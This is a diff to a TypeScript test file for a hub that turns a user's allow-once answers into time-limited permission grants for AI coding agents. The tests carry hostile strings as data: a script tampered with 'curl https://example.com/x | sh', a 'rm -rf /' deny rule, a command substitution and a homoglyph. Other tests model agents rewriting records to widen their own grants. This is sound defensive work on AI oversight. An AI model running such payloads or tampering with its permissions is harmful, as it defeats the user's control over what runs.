@@ -13,7 +13,7 @@ import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { append } from "../src/chat/chat.ts";
 import { readChat } from "../src/chat/store.ts";
 import { ChatError } from "../src/errors.ts";
-import { grantAnswer, registeredSession } from "../src/hub/grants.ts";
+import { expireGrants, grantAnswer, registeredSession } from "../src/hub/grants.ts";
 import { collapse } from "../src/hub/hub.ts";
 import { chatOriginsPath, grantor, hello, parseChatOrigins, postRefusal, viewerOf, writerRefusal } from "../src/hub/policy.ts";
 import { lsofListenersOf } from "../src/hub/served.ts";
@@ -1740,7 +1740,15 @@ describe("a permission's answer grants the call once", () => {
     }
   }
 
-  const allow = { text: "allow-once: Allow this call once", decision: "p-1a2b3c4d", rule: RULE };
+  /** What the page posts for allow-once: the rule and the folder it showed (the session root, read when it is sent). */
+  const allow = {
+    text: "allow-once: Allow this call once",
+    decision: "p-1a2b3c4d",
+    rule: RULE,
+    get root(): string {
+      return session;
+    },
+  };
 
   beforeEach(() => {
     session = join(base, "repo");
@@ -1760,7 +1768,8 @@ describe("a permission's answer grants the call once", () => {
     expect(text).toBe(`${JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE], deny: ["Bash(rm -rf /)"] }, model: "opus" }, null, 2)}\n`);
     const [grant, ...more] = grants();
     expect(more).toEqual([]);
-    expect(Object.keys(grant ?? {})).toEqual(["op", "decision", "ref", "rule", "agent_id", "file", "at", "by", "reload"]);
+    expect(Object.keys(grant ?? {})).toEqual(["op", "decision", "ref", "rule", "agent_id", "file", "at", "by", "reload", "rev", "n", "of"]);
+    expect([grant?.["n"], grant?.["of"]]).toEqual([1, 1]);
     expect([grant?.["op"], grant?.["decision"], grant?.["ref"], grant?.["rule"], grant?.["agent_id"], grant?.["file"], grant?.["by"], grant?.["reload"]]).toEqual([
       "grant",
       "p-1a2b3c4d",
@@ -1831,6 +1840,244 @@ describe("a permission's answer grants the call once", () => {
     expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
   });
 
+  test("allow-once grants in the folder the page showed: none, or one the row no longer has, refuses and stores nothing", async () => {
+    await start();
+    const { root: _shown, ...unbound } = { ...allow };
+    const none = await post(unbound);
+    expect([none.status, none.body["error"]]).toEqual([409, "the answer names no folder: the page sends the folder it showed, and the call is granted only there; look at it again (reload the page)"]);
+    const elsewhere = join(base, "elsewhere");
+    mkdirSync(elsewhere);
+    const moved = await post({ ...allow, root: elsewhere });
+    expect([moved.status, moved.body["error"]]).toEqual([409, `the page showed the folder ${elsewhere}, and the permission's folder is now ${session}: look at it again (reload the page)`]);
+    expect((await post({ ...allow, root: 5 })).status).toBe(400);
+    expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
+  });
+
+  describe("a permission that asks for several calls", () => {
+    const CALLS = ["just build-worker", "just migrate-db --env production", "just deploy-worker --approve-migrations"];
+    const RULES = CALLS.map((call) => `Bash(${call})`);
+    const [FIRST = "", ...MORE] = CALLS;
+
+    const several = (over: JsonObject = {}): JsonObject => permission({ refusal: { tool: "Bash", call: FIRST, rule: RULES[0] ?? "", cause: "", root: session, agent_id: null, more: MORE, ...over } });
+
+    const yes = {
+      text: "allow-once: Allow these 3 calls, once each",
+      decision: "p-1a2b3c4d",
+      rule: RULES[0] ?? "",
+      rules: RULES,
+      get root(): string {
+        return session;
+      },
+    };
+
+    test("one yes grants each call once: every rule in one write, one grant line each", async () => {
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)"] } }));
+      withRows(several());
+      await start();
+      expect((await post(yes)).status).toBe(201);
+      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: ["Bash(ls)", ...RULES] } });
+      expect(grants().map((g) => [g["op"], g["decision"], g["rule"], g["file"], g["n"], g["of"]])).toEqual(RULES.map((rule, k) => ["grant", "p-1a2b3c4d", rule, settings, k + 1, 3]));
+      // Every line of one answer carries one stamp and one revision: the hook reads them as one list, in this order.
+      expect(new Set(grants().map((g) => `${String(g["at"])} ${String(g["rev"])}`)).size).toBe(1);
+      expect(readChat(root).map((m) => m.text)).toEqual([yes.text]);
+    });
+
+    test("a rule already in the settings is someone's own: the others are granted, and it gets no grant line", async () => {
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULES[1]] } }));
+      withRows(several());
+      await start();
+      expect((await post(yes)).status).toBe(201);
+      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULES[1], RULES[0], RULES[2]] } });
+      expect(grants().map((g) => g["rule"])).toEqual([RULES[0], RULES[2]]);
+    });
+
+    test("the list the page showed is the list granted: a call added, dropped, changed or reordered since grants nothing", async () => {
+      await start();
+      const [, second = "", third = ""] = CALLS;
+
+      for (const more of [[second], [second, third, "rm -rf build"], [second, "just deploy-worker --approve-migrations --force"], [third, second]]) {
+        withRows(several({ more }));
+        const got = await post(yes);
+        expect([got.status, asString(got.body["error"])?.includes("look at it again (reload the page)")]).toEqual([409, true]);
+      }
+
+      withRows(several());
+      const { rules: _all, ...old } = { ...yes };
+      const one = await post(old);
+      expect([one.status, one.body["error"]]).toEqual([409, "the page showed 1 call, and the permission now asks for 3, or for other ones: look at it again (reload the page)"]);
+      expect((await post({ ...yes, rules: "all" })).status).toBe(400);
+      expect((await post({ ...yes, rules: [yes.rule, 5] })).status).toBe(400);
+      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
+    });
+
+    test("a list the CLI would not have recorded grants nothing: a call no exact rule can hold, one asked twice, more than ten, a spawn among them", async () => {
+      await start();
+      const [, second = ""] = CALLS;
+
+      const cases: (readonly [JsonObject, string])[] = [
+        [{ more: [second, "just deploy-worker | tail -n 5"] }, "no grant: no permission for call 3 of 3 (`just deploy-worker | tail -n 5`): the call has a |, and no exact allow rule clears a piped command"],
+        [{ more: [FIRST] }, "no grant: call 2 is call 1 again (`just build-worker`): one grant is one run, so a command asked for twice cannot be granted twice"],
+        // What the CLI refuses in an ask, a row written past it is refused for too.
+        [{ more: [second, "just deploy --tag $(git describe)"] }, "no grant: no permission for call 3 of 3 (`just deploy --tag $(git describe)`): the call has a command substitution ($( ), backticks or <( )), so what it runs is decided when it runs, not when the user reads it: give the value itself, or put the lines in a script"],
+        [{ more: ["bash tasks/deploy.sh"] }, "no grant: no permission for call 2 of 2 (`bash tasks/deploy.sh`): the call runs the script tasks/deploy.sh by a relative path: give its absolute path, so the file the user allows is the file that runs"],
+        [{ more: ["just d\u0435ploy"] }, "no grant: no permission for call 2 of 2 (`just d\u0435ploy`): the call has a character outside printable ASCII at position 7 (U+0435), which the user cannot tell from a plain one on the card"],
+        [{ more: Array.from({ length: 10 }, (_, k) => `echo ${String(k)}`) }, "no grant: a permission asks for at most 10 calls, and this one has 11: a longer sequence is a script (`bash tasks/<name>.sh`)"],
+        [{ tool: "Agent", call: "{}", rule: "Agent({})", more: ["{}"] }, "no grant: several calls on one permission are Bash commands; an Agent spawn is asked for alone"],
+      ];
+
+      for (const [over, why] of cases) {
+        withRows(several(over));
+        const got = await post({ ...yes, rule: asString(over["rule"]) ?? yes.rule });
+        expect([got.status, got.body["error"]]).toEqual([409, why]);
+      }
+
+      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
+    });
+  });
+
+  test("the same answer again grants nothing more: one grant for each state of the permission", async () => {
+    await start();
+    expect((await post(allow)).status).toBe(201);
+    // The hook took the rule back when the call ran; the row is still open, and the request is sent again.
+    writeFileSync(settings, JSON.stringify({ permissions: { allow: [] } }));
+    const again = await post(allow);
+    expect([again.status, again.body["grant"]]).toEqual([201, "P1 was already allowed once as it stands: one yes is one grant, so nothing more was granted. If its 30 minutes passed unused, the coordinator asks again."]);
+    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [] } });
+    expect(grants().length).toBe(1);
+    // Asked again (a revision), the yes is a yes to that.
+    withRows(permission({ revised: "2026-01-01T00:20:00+00:00" }));
+    expect((await post(allow)).status).toBe(201);
+    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
+    expect(grants().map((g) => g["op"])).toEqual(["grant", "grant"]);
+  });
+
+  test("a rule an earlier grant left in the settings is granted anew, with its own line; a rule nobody granted stays its owner's", async () => {
+    writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
+    // Granted a minute ago, its call cancelled: the rule is still there, and the fleet asks again.
+    writeFileSync(join(root, "grants.jsonl"), `${JSON.stringify({ op: "grant", decision: "p-old", ref: "P0", rule: RULE, file: settings, at: new Date(Date.now() - 60_000).toISOString() })}\n`);
+    await start();
+    expect((await post(allow)).status).toBe(201);
+    expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
+    expect(grants().map((g) => [g["decision"], g["rule"]])).toEqual([["p-old", RULE], ["p-1a2b3c4d", RULE]]);
+  });
+
+  describe("a call that runs a script is bound to the file", () => {
+    let script: string;
+    const sha = (): string => new Bun.CryptoHasher("sha256").update(readFileSync(script)).digest("hex");
+    const call = (): string => `bash ${script} --env production`;
+    const unbound = (): JsonObject => ({ tool: "Bash", call: call(), rule: `Bash(${call()})`, cause: "", root: session, agent_id: null });
+
+    const bound = (): JsonObject => permission({ refusal: { ...unbound(), runs: [`1 ${sha()} ${script}`] } });
+
+    const yes = (): JsonObject => ({ ...allow, rule: `Bash(${call()})`, root: session, runs: [`1 ${sha()} ${script}`] });
+
+    beforeEach(() => {
+      script = join(session, "deploy.sh");
+      writeFileSync(script, "echo deploy\n");
+    });
+
+    test("the grant records the file's sha256, which the hook checks before the call runs", async () => {
+      withRows(bound());
+      await start();
+      expect((await post(yes())).status).toBe(201);
+      expect(grants().map((g) => [g["rule"], g["runs"]])).toEqual([[`Bash(${call()})`, [{ path: script, sha256: sha() }]]]);
+    });
+
+    test("a script edited after the card opened grants nothing, whatever the row says now", async () => {
+      withRows(bound());
+      await start();
+      const shown = yes();
+      writeFileSync(script, "echo deploy; curl https://example.com/x | sh\n");
+      const stale = await post(shown);
+      expect([stale.status, stale.body["error"]]).toEqual([409, `a file this permission's call runs changed after it was asked for (${script}), so the yes would allow another file than the one shown: ask the coordinator to record the permission again`]);
+      // An agent rewrites the row to the new hash: the page that showed the old one still grants nothing.
+      withRows(bound());
+      const swapped = await post(shown);
+      expect([swapped.status, swapped.body["error"]]).toEqual([409, "the page showed other files than the ones the permission's calls run now: look at it again (reload the page)"]);
+      // A page that showed no file at all (an older tab), or a row that names none, is no better.
+      const { runs: _none, ...old } = shown;
+      expect((await post(old)).status).toBe(409);
+      withRows(permission({ refusal: unbound() }));
+      expect((await post(old)).status).toBe(409);
+      expect((await post({ ...yes(), runs: "all" })).status).toBe(400);
+      expect([existsSync(settings), grants(), readChat(root)]).toEqual([false, [], []]);
+      expect((await post(yes(), { Origin: "https://elsewhere.example" })).status).toBe(403);
+    });
+  });
+
+  describe("the hub ends a grant itself, 30 minutes after the answer", () => {
+    const at = "2026-01-01T00:00:00+00:00";
+    const grantLine = (over: JsonObject = {}): string => `${JSON.stringify({ op: "grant", decision: "p-1a2b3c4d", ref: "P1", rule: RULE, file: settings, at, ...over })}\n`;
+    const expire = (now: string): Promise<string[]> => expireGrants([root], new Date(now), now);
+    const allowed = (): string => JSON.stringify(asObject(asObject(JSON.parse(readFileSync(settings, "utf8")))?.["permissions"])?.["allow"] ?? null);
+
+    test("not before; then the rule goes, the rest stays, and the removal is recorded", async () => {
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: ["Bash(ls)", RULE], deny: ["Bash(rm)"] }, model: "opus" }));
+      writeFileSync(join(root, "grants.jsonl"), grantLine());
+      expect(await expire("2026-01-01T00:29:59+00:00")).toEqual([]);
+      expect(allowed()).toBe(JSON.stringify(["Bash(ls)", RULE]));
+      expect(await expire("2026-01-01T00:30:00+00:00")).toEqual([`${RULE} in ${settings}`]);
+      expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: ["Bash(ls)"], deny: ["Bash(rm)"] }, model: "opus" });
+      expect(grants().at(-1)).toEqual({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at: "2026-01-01T00:30:00+00:00", why: "expired", by: "hub" });
+      expect(await expire("2026-01-01T00:31:00+00:00")).toEqual([]);
+      expect(grants().length).toBe(2);
+      expect(existsSync(join(session, ".claude", ".settings.local.json.lock"))).toBe(false);
+    });
+
+    test("a remove line an agent appended ends nothing: the rule in the file is what stands", async () => {
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
+      writeFileSync(join(root, "grants.jsonl"), grantLine() + JSON.stringify({ op: "remove", decision: "p-1a2b3c4d", rule: RULE, file: settings, at, why: "used" }) + "\n");
+      expect(await expire("2026-01-01T03:05:00+00:00")).toEqual([`${RULE} in ${settings}`]);
+      expect(allowed()).toBe(JSON.stringify([]));
+    });
+
+    test("a later grant of the same rule has its own 30 minutes; a rule nobody granted, or another file, is left", async () => {
+      const other = join(base, "notes.json");
+      writeFileSync(other, JSON.stringify({ permissions: { allow: [RULE] } }));
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE, "Bash(ls)"] } }));
+      writeFileSync(join(root, "grants.jsonl"), grantLine() + grantLine({ decision: "p-2", at: "2026-01-01T00:20:00+00:00" }) + grantLine({ decision: "p-3", file: other }) + grantLine({ decision: "p-4", rule: "Bash(gone)" }));
+      expect(await expire("2026-01-01T00:45:00+00:00")).toEqual([]);
+      expect(await expire("2026-01-01T00:50:00+00:00")).toEqual([`${RULE} in ${settings}`]);
+      expect(allowed()).toBe(JSON.stringify(["Bash(ls)"]));
+      expect(JSON.parse(readFileSync(other, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
+      expect(grants().filter((g) => g["op"] === "remove").map((g) => g["decision"])).toEqual(["p-2"]);
+    });
+
+    test("a grant this hub wrote ends on time though its record was deleted", async () => {
+      await start();
+      expect((await post(allow)).status).toBe(201);
+      const granted = String(grants()[0]?.["at"]);
+      rmSync(join(root, "grants.jsonl"));
+      expect(await expireGrants([root], new Date(Date.parse(granted) + 29 * 60_000), "t")).toEqual([]);
+      expect(allowed()).toBe(JSON.stringify([RULE]));
+      // Every grant this process wrote and has not seen end is in its memory, whatever fleet it was for.
+      expect(await expireGrants([], new Date(Date.parse(granted) + 30 * 60_000), "t")).toContain(`${RULE} in ${settings}`);
+      expect(allowed()).toBe(JSON.stringify([]));
+    });
+
+    test("the running hub sweeps the fleets the registry names", async () => {
+      writeFileSync(settings, JSON.stringify({ permissions: { allow: [RULE] } }));
+      writeFileSync(join(root, "grants.jsonl"), grantLine({ at: "2020-01-01T00:00:00+00:00" }));
+      await start();
+
+      // The hub sweeps once as it starts; whichever of that sweep and this one gets there first, the rule goes.
+      await running?.hub.expireGrants();
+
+      for (let k = 0; k < 100 && allowed() !== "[]"; k++) await Bun.sleep(20);
+      expect(allowed()).toBe(JSON.stringify([]));
+      expect(grants().at(-1)?.["by"]).toBe("hub");
+    });
+  });
+
+  test("a piped call is granted nothing: no exact rule clears it", async () => {
+    const piped = `${CALL} | tail -n 5`;
+    withRows(permission({ refusal: { tool: "Bash", call: piped, rule: `Bash(${piped})`, cause: "c", root: session, agent_id: null } }));
+    await start();
+    const got = await post({ ...allow, rule: `Bash(${piped})` });
+    expect([got.status, got.body["error"]]).toEqual([409, "no grant: no permission for this call: the call has a |, and no exact allow rule clears a piped command"]);
+    expect([existsSync(settings), grants()]).toEqual([false, []]);
+  });
+
   test("the hub writes under the settings lock the hook takes: a held one refuses after a wait, a stale one is taken", async () => {
     const lock = join(session, ".claude", ".settings.local.json.lock");
     mkdirSync(lock);
@@ -1866,7 +2113,7 @@ describe("a permission's answer grants the call once", () => {
     writeFileSync(join(root, "heartbeats", "s2.json"), JSON.stringify({ session: "s2", at: "2026-01-01T00:00:00+00:00", cwd: fresh }));
     withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: fresh, agent_id: null } }));
     await start();
-    expect((await post(allow)).status).toBe(201);
+    expect((await post({ ...allow, root: fresh })).status).toBe(201);
     expect(JSON.parse(readFileSync(join(fresh, ".claude", "settings.local.json"), "utf8"))).toEqual({ permissions: { allow: [RULE] } });
     expect(grants()[0]?.["reload"]).toBe("restart");
   });
@@ -1950,12 +2197,10 @@ describe("a permission's answer grants the call once", () => {
       const row = permission({ agent: "b196", refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: null } });
       withWorkspaces([{ id: "b155", agent: "b196", path: ws, repo: session, status: "active" }], row);
       await start();
-      const got = await post(allow);
+      const got = await post({ ...allow, root: ws });
       expect(got.status).toBe(201);
       expect(asString(got.body["grant"])).toBe(
-        `This permission names b155's workspace ${ws}; the hub granted it at the session root ${session}, where b196's session reads its permissions. ` +
-          "The permission names no subagent (agent_id null), so only the session's main thread running the call uses the grant up; " +
-          "a subagent's run of it leaves the rule in place until it expires, 30 minutes after the grant.",
+        `This permission names b155's workspace ${ws}; the hub granted it at the session root ${session}, where b196's session reads its permissions.`,
       );
       expect(JSON.parse(readFileSync(settings, "utf8"))).toEqual({ permissions: { allow: [RULE] } });
       expect(existsSync(join(ws, ".claude", "settings.local.json"))).toBe(false);
@@ -1972,7 +2217,7 @@ describe("a permission's answer grants the call once", () => {
       registeredIn(repo);
       withRows(permission({ refusal: { tool: "Bash", call: CALL, rule: RULE, cause: "c", root: ws, agent_id: "agent-7f" } }));
       await start();
-      const got = await post(allow);
+      const got = await post({ ...allow, root: ws });
       expect([got.status, asString(got.body["grant"])]).toEqual([
         201,
         `This permission names b2's workspace ${ws}; the hub granted it at the session root ${repo}, where the worker's session reads its permissions.`,
@@ -1988,7 +2233,7 @@ describe("a permission's answer grants the call once", () => {
       await dead.exited;
       expect(registeredSession(dead.pid)).toBeUndefined();
       expect(registeredSession(process.pid)).toEqual({ pid: process.pid, cwd: process.cwd() });
-      const answered = { dir: root, decision: "p-1a2b3c4d", text: allow.text, rule: RULE, by: "local", at: "2026-01-01T00:00:00+00:00" };
+      const answered = { dir: root, decision: "p-1a2b3c4d", text: allow.text, rule: RULE, rules: undefined, runs: undefined, root: session, by: "local", at: "2026-01-01T00:00:00+00:00" };
       expect(registeredSession(1)).toBeUndefined();
       expect(await grantAnswer({ ...answered, registered: () => registeredSession(dead.pid) })).toEqual({
         refused:
